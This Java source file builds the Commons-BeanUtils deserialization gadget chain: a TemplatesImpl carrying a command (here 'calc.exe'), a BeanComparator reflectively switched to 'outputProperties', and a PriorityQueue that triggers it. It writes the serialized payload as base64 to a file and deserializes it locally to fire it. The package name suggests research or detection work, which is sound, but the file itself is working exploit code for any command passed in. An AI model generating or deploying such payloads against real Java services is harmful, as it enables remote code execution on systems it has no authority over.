package me.n1ar4.fake.gadget;

import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

@SuppressWarnings("all")
public class CB {
    public static void main(String[] args) throws Exception {
        CB c = new CB();
        Object obj = c.getObject("calc.exe");
        String base64 = Base64.getEncoder().encodeToString(SerUtil.serializeObject(obj));
        Files.write(Paths.get("test.txt"), base64.getBytes());
        SerUtil.deserializeObject(SerUtil.serializeObject(obj));
    }

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}
